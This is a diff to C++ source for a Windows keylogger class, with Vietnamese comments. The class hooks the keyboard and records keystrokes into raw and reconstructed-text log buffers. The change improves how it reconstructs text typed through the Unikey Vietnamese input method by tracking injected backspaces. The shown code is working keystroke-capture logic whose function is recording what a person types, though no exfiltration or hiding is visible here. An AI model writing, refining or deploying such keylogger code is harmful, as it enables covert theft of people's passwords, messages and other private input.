@@ -8,7 +8,8 @@ Keylogger::Keylogger()
     : _isRunning(false), _hook(NULL), _threadId(0),
     _detectedMode("Auto-Detect"),
     _inputMethodStatus("Waiting..."),
-    _lastPhysicalKey(0) {
+    _lastPhysicalKey(0),
+    _lastWasInjectedBackspace(false) {
     g_KeyloggerInstance = this;
 }
 
@@ -184,8 +185,6 @@ std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps)
     case VK_ZOOM:       return "[ZOOM]";
     case VK_PA1:        return "[PA1]";
 
-        // --- 0xFF (Fix lỗi 0xFF) ---
-        // Đây thường là phím Fn hoặc phím rác do phần cứng gửi liên tục
     case 0xFF: return ""; // Bỏ qua, không in ra cho đỡ rối
     }
 
@@ -195,7 +194,6 @@ std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps)
     return std::string(buff);
 }
 
-// --- SỬA LOGIC NHẬN DIỆN MODE ---
 void Keylogger::AnalyzeInputMethod(DWORD vkCode, bool isInjected) {
     HKL currentLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
 
@@ -223,7 +221,7 @@ void Keylogger::AnalyzeInputMethod(DWORD vkCode, bool isInjected) {
             // Nếu trước đó không phải Unikey thì chốt là Tiếng Anh
             if (_inputMethodStatus.find("Unikey") == std::string::npos) {
                 _inputMethodStatus = "ENGLISH (Confirmed)";
-                _detectedMode = "---"; // <--- THÊM DÒNG NÀY ĐỂ RESET MODE
+                _detectedMode = "---"; 
             }
         }
         _lastPhysicalKey = vkCode;
@@ -235,25 +233,32 @@ void Keylogger::ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
 
     AnalyzeInputMethod(vkCode, isInjected);
 
-    // 1. RAW BUFFER
+    // [RAW BUFFER] 
     if (!isInjected) {
         bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
         bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
         _rawLogBuffer += MapVkToRawString(vkCode, isShift, isCaps);
     }
 
-    // 2. TEXT BUFFER
+    // Xử lý phím BACKSPACE
     if (vkCode == VK_BACK) {
         PopLastUtf8Char(_finalLogBuffer);
-        return;
+
+        // Nếu Backspace này do phần mềm (Unikey) gửi, bật cờ lên
+        if (isInjected) _lastWasInjectedBackspace = true;
+        else _lastWasInjectedBackspace = false;
+
+        return; // Kết thúc xử lý phím Backspace
     }
 
-    // TAB đổi thành dấu cách cho gọn
+    // Xử lý các phím ký tự (TAB đổi thành Space)
     if (vkCode == VK_TAB) {
         _finalLogBuffer += " ";
+        _lastWasInjectedBackspace = false; // Reset cờ
         return;
     }
 
+    // Chuyển đổi sang Unicode
     BYTE keyboardState[256];
     GetKeyboardState(keyboardState);
     if (GetKeyState(VK_SHIFT) & 0x8000) keyboardState[VK_SHIFT] = 0x80;
@@ -264,10 +269,22 @@ void Keylogger::ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
     else { ToUnicode(vkCode, scanCode, keyboardState, buffer, 16, 0); }
 
     char utf8Buffer[16] = { 0 };
+    // Nếu chuyển đổi thành công ra ký tự văn bản
     if (WideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8Buffer, 16, NULL, NULL) > 0) {
+
+        if (isInjected && _lastWasInjectedBackspace) {
+            PopLastUtf8Char(_finalLogBuffer);
+        }
+
+        // Reset cờ vì phím này không phải Backspace
+        _lastWasInjectedBackspace = false;
+
         bool isCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
-        // Chỉ ghi ký tự nếu không phải Ctrl (trừ Enter)
         if (!isCtrl || vkCode == VK_RETURN) _finalLogBuffer += utf8Buffer;
+    }
+    else {
+        // Nếu không ra ký tự (ví dụ phím F1, Shift...), cũng reset cờ
+        _lastWasInjectedBackspace = false;
     }
 }
 
